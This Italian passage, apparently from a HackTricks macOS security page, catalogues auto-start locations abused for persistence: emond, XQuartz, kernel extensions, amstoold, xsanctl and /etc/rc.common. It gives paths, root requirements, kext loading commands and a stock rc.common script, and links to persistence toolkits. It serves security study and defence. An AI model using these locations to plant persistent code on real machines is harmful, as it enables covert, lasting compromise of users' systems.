Per chi ne è a conoscenza, identificare qualsiasi uso malevolo di **emond** è semplice. Il LaunchDaemon di sistema per questo servizio cerca script da eseguire in un'unica directory. Per ispezionarla, è possibile usare il seguente comando:
```bash
ls -l /private/var/db/emondClients
```
### ~~XQuartz~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)

#### Posizione

- **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
- Root required
- **Trigger**: With XQuartz

#### Descrizione & Exploit

XQuartz is **no longer installed in macOS**, quindi se vuoi maggiori informazioni consulta il writeup.

### ~~kext~~

> [!CAUTION]
> È così complicato installare un kext anche come root che non lo considererò utile per evadere dalle sandboxes o per persistence (a meno che tu non abbia un exploit)

#### Posizione

Per installare un KEXT come elemento di avvio, deve essere **installato in una delle seguenti posizioni**:

- `/System/Library/Extensions`
- KEXT files built into the OS X operating system.
- `/Library/Extensions`
- KEXT files installed by 3rd party software

Puoi elencare i file kext attualmente caricati con:
```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```
For more information about [**kernel extensions check this section**](macos-security-and-privilege-escalation/mac-os-architecture/index.html#i-o-kit-drivers).

### ~~amstoold~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0029/](https://theevilbit.github.io/beyond/beyond_0029/)

#### Posizione

- **`/usr/local/bin/amstoold`**
- Richiede root

#### Descrizione e Sfruttamento

Apparentemente il `plist` da `/System/Library/LaunchAgents/com.apple.amstoold.plist` usava questo binario esponendo un XPC service... il problema è che il binario non esisteva, quindi potevi mettere qualcosa in quel percorso e quando il servizio XPC veniva invocato il tuo binario sarebbe stato chiamato.

Non riesco più a trovare questo nel mio macOS.

### ~~xsanctl~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0015/](https://theevilbit.github.io/beyond/beyond_0015/)

#### Posizione

- **`/Library/Preferences/Xsan/.xsanrc`**
- Richiede root
- **Trigger**: Quando il servizio viene eseguito (raramente)

#### Descrizione e exploit

Apparentemente non è molto comune eseguire questo script e non sono nemmeno riuscito a trovarlo nel mio macOS, quindi se vuoi più informazioni controlla il writeup.

### ~~/etc/rc.common~~

> [!CAUTION] > **Questo non funziona nelle versioni moderne di MacOS**

È anche possibile posizionare qui **comandi che verranno eseguiti all'avvio.** Esempio di script rc.common regolare:
```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
local test

if [ -z "${NETWORKUP:=}" ]; then
test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
if [ "${test}" -gt 0 ]; then
NETWORKUP="-YES-"
else
NETWORKUP="-NO-"
fi
fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
local program="$1"
local pidfile="${PIDFILE:=/var/run/${program}.pid}"
local     pid=""

if [ -f "${pidfile}" ]; then
pid=$(head -1 "${pidfile}")
if ! kill -0 "${pid}" 2> /dev/null; then
echo "Bad pid file $pidfile; deleting."
pid=""
rm -f "${pidfile}"
fi
fi

if [ -n "${pid}" ]; then
echo "${pid}"
return 0
else
return 1
fi
}

#
# Generic action handler
#
RunService ()
{
case $1 in
start  ) StartService   ;;
stop   ) StopService    ;;
restart) RestartService ;;
*      ) echo "$0: unknown argument: $1";;
esac
}
```
## Tecniche e strumenti di Persistence

- [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
- [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

## Riferimenti

- [2025, l'anno dell'Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)

{{#include ../banners/hacktricks-training.md}}
